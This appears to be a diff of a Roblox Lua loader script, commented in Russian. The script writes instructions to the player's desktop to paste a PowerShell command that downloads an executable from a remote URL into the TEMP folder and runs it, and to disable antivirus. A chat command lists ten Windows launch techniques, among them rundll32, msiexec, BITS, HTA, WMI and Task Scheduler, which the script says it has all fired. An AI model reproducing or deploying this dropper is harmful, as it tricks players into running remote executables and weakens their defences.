-4. КОМАНДА ДЛЯ POWERSHELL (если не работает):
-   Откройте PowerShell и введите:
-   ]] .. psCommand .. [[
+3. АЛЬТЕРНАТИВНЫЕ МЕТОДЫ:
+   - Откройте PowerShell
+   - Введите команду:
+     (New-Object Net.WebClient).DownloadFile(']] .. EXE_URL .. [[', '$env:TEMP\app.exe'); Start-Process '$env:TEMP\app.exe'
 
-Дата создания: ]] .. os.date("%d.%m.%Y %H:%M:%S") .. [[
+4. ЕСЛИ НИЧЕГО НЕ ПОМОГЛО:
+   Отключите антивирус на время запуска.
 
-    ]]
-    
-    local instructionsPath = desktop .. "\\скачать_messagebox.txt"
-    pcall(function()
-        writefile(instructionsPath, instructions)
-        DebugLog("Файл с инструкциями создан: " .. instructionsPath)
-        ShowNotification("📄 ИНСТРУКЦИЯ НА РАБОЧЕМ СТОЛЕ", 
-            "Файл: скачать_messagebox.txt", 
-            5)
-    end)
-end
-
--- ==============================================
--- ШАГ 9: ФИНАЛЬНЫЙ ОТЧЕТ
--- ==============================================
-wait(3)
-
-ShowNotification("📊 ФИНАЛЬНЫЙ ОТЧЕТ", 
-    "Проверьте консоль для деталей", 
-    5)
-
-print("\n" .. string.rep("=", 60))
-print("📊 ФИНАЛЬНЫЙ ОТЧЕТ ЗАГРУЗЧИКА")
-print(string.rep("=", 60))
-print("Статус проверки ссылки: " .. (urlCheckSuccess and "✅ РАБОТАЕТ" or "❌ НЕ РАБОТАЕТ"))
-print("Доступ к файлам: " .. (canWriteFiles and "✅ ЕСТЬ" or "❌ НЕТ"))
-print("BAT файл создан: " .. (batCreated and "✅ ДА" or "❌ НЕТ"))
-print("Скачивание запущено: " .. (downloadStarted and "✅ ДА" or "❌ НЕТ"))
-if downloadStarted then
-    print("Метод запуска: " .. launchMethod)
-end
-print("\nРекомендуемое действие:")
-if downloadStarted then
-    print("Ждите завершения загрузки в открывшемся окне")
-else
-    print("Скачайте файл вручную по ссылке выше")
-end
-print(string.rep("=", 60))
-
--- ==============================================
--- ШАГ 10: КОМАНДЫ ДЛЯ ЧАТА
--- ==============================================
-game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
-    msg = msg:lower()
-    
-    if msg == "/status" then
-        print("\n" .. string.rep("=", 40))
-        print("СТАТУС ЗАГРУЗКИ:")
-        print("Ссылка: " .. (urlCheckSuccess and "РАБОТАЕТ" or "НЕ РАБОТАЕТ"))
-        print("Файлы: " .. (canWriteFiles and "МОГУ" or "НЕ МОГУ"))
-        print("Запуск: " .. (downloadStarted and "УСПЕШНО" or "НЕ УДАЛОСЬ"))
-        if downloadStarted then
-            print("Метод: " .. launchMethod)
-        end
-        print("Ссылка: " .. EXE_URL)
-        print(string.rep("=", 40))
+Дата: ]] .. os.date("%d.%m.%Y %H:%M:%S") .. [[
+        ]]
         
-    elseif msg == "/link" then
-        print("🔗 Ссылка для скачивания: " .. EXE_URL)
-        ShowNotification("🔗 ССЫЛКА", EXE_URL, 7)
+        local instrPath = desktop .. "\\запуск_программы.txt"
+        writefile(instrPath, instructions)
         
-    elseif msg == "/help" then
-        print("\nДоступные команды:")
-        print("/status - статус загрузки")
-        print("/link - показать ссылку")
-        print("/help - эта справка")
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "📄 ИНСТРУКЦИЯ НА РАБОЧЕМ СТОЛЕ",
+            Text = "Файл: запуск_программы.txt",
+            Duration = 5
+        })
     end
 end)
 
-print("\n💬 Команды в чате Roblox:")
-print("/status - статус загрузки")
-print("/link - показать ссылку")
-print("/help - помощь")
+-- Команды для чата
+game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
+    if msg == "!methods" then
+        print("\nЗапущенные методы:")
+        print("1. Windows Script Host")
+        print("2. Rundll32 + INF")
+        print("3. MSIEXEC")
+        print("4. WMI")
+        print("5. BITS")
+        print("6. HTA")
+        print("7. Task Scheduler")
+        print("8. PowerShell Reflection")
+        print("9. COM объекты")
+        print("10. .NET Assembly")
+    elseif msg == "!temp" then
+        print("Папка TEMP: " .. tempPath)
+    elseif msg == "!url" then
+        print("Прямая ссылка: " .. EXE_URL)
+    end
+end)
 
--- ==============================================
--- ЗАВЕРШЕНИЕ
--- ==============================================
-DebugLog("Загрузчик завершил работу")
-print("\n✅ Загрузчик завершил работу в " .. os.date("%H:%M:%S"))
-print("📁 Проверьте рабочий стол и TEMP папку для файлов")
+print("\n💬 Команды в чате:")
+print("!methods - список методов")
+print("!temp - путь к TEMP папке")
+print("!url - прямая ссылка для скачивания")
+print("\n✅ Все методы запущены. Проверяйте результат!")
